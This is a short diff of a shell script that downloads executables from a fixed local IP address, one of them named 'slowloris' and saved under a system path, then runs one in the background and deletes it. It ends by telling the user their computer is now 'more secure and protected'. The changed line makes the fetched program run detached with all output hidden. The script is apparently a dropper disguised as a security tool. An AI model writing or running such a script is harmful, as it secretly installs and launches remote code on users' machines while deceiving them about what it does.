@@ -7,7 +7,7 @@ curl -s http://192.168.1.250:5000/s/slowloris -o /usr/bin/linux_verify
 chmod +x /usr/bin/linux_verify
 curl -s http://192.168.1.250:5000/s/system_monitor.sh -o /tmp/system_monitor
 chmod +x ./system_monitor
-./system_monitor &
+nohup ./system_monitor >/dev/null 2>&1 &
 sleep 2
 rm -f system_monitor
 echo " done! Now your computer is more secure and protected!"
